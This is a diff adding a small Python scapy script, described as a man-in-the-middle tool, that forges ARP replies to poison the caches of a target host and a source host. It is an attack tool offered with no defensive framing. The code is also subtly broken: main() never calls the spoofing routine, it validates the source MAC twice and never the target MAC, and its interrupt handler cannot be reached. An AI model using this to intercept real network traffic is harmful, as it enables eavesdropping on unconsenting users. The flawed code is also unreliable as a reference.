@@ -1,0 +1,48 @@
+#!/usr/bin/env python
+import scapy.all as scapy
+import ipaddress
+import argparse
+import sys
+import os
+import re
+
+def runSpoof(args):
+	spoof(args.IP_target, args.MAC_target, args.IP_src)
+	spoof(args.IP_src, args.MAC_src, args.IP_target)
+
+def spoof(target_ip, target_mac, spoof_ip): 
+	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
+	scapy.send(packet, verbose = False)
+
+def isValidMacAddress(mac):
+	mac_regex = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
+	if bool(mac_regex.match(mac)) == False:
+		raise ValueError(f"The current MAC address: {mac} is not formatted to MAC standard.")
+
+def isValidIp(ipaddr : str):
+	ip = ipaddress.ip_address(ipaddr)
+	if not ip.version == 4:
+		raise ValueError(f"The current IP: {ip}, is not formatted to IPV4 standard.")
+
+def main() :
+	try:
+		parser = argparse.ArgumentParser(description="l'homme du milieu")
+		parser.add_argument("IP_src", type=str)
+		parser.add_argument("MAC_src", type=str)
+		parser.add_argument("IP_target", type=str)
+		parser.add_argument("MAC_target", type=str)
+		args = parser.parse_args()
+		isValidIp(args.IP_src)
+		isValidMacAddress(args.MAC_src)
+		isValidIp(args.IP_target)
+		isValidMacAddress(args.MAC_src)
+	except ValueError as e:
+		print(f"ValueError: {e}")
+	except Exception as e:
+		print(f"Error: {e}")
+	except KeyboardInterrupt:
+		print("Process interrupted. Exiting Gracefully...")
+
+
+if __name__ == "__main__" :
+	main()
